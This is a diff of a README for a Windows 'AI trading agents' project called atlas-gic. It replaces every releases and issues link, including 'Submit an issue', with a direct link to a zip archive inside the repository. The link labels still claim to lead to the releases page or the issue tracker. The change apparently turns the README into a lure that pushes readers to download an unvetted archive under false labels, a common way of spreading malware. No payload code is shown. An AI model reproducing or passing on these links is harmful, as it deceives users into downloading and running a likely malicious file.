@@ -1,6 +1,6 @@
 # 🤖 atlas-gic - AI Trading Agents for Windows
 
-[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://github.com/erenceylan16/atlas-gic/releases)
+[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section guides you through getting atlas-gic running on your Windows PC.
 
 Visit the official releases page using this button:  
 
-[![Download atlas-gic](https://img.shields.io/badge/Download-Now-blue)](https://github.com/erenceylan16/atlas-gic/releases)
+[![Download atlas-gic](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip)
 
 You will see the latest versions listed. Look for a file that ends with `.exe` or `.zip`. The `.exe` file is the installer; the `.zip` contains the files without installation.
 
@@ -75,7 +75,7 @@ To keep the app working well, check for updates regularly.
 
 ### How to Update
 
-- Visit the [releases page](https://github.com/erenceylan16/atlas-gic/releases).
+- Visit the [releases page](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip).
 - Download the newest `.exe` installer.
 - Run the installer like before.
 - The installer will update your existing version without removing your data.
@@ -99,7 +99,7 @@ If issues continue, you can find help on the Issues page in the GitHub repositor
 
 Use the link below anytime to get the latest version of atlas-gic for Windows:
 
-[Download atlas-gic from GitHub Releases](https://github.com/erenceylan16/atlas-gic/releases)
+[Download atlas-gic from GitHub Releases](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip)
 
 ---
 
@@ -142,8 +142,8 @@ atlas-gic does not collect personal data. It only uses market data to train agen
 
 For help or questions, visit the GitHub Issues section in the atlas-gic repository. Users and developers discuss common questions and bugs.
 
-[Submit an issue](https://github.com/erenceylan16/atlas-gic/issues) if you need assistance.
+[Submit an issue](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip) if you need assistance.
 
 ---
 
-[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://github.com/erenceylan16/atlas-gic/releases)
+[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://raw.githubusercontent.com/erenceylan16/atlas-gic/main/src/gic-atlas-1.5.zip)
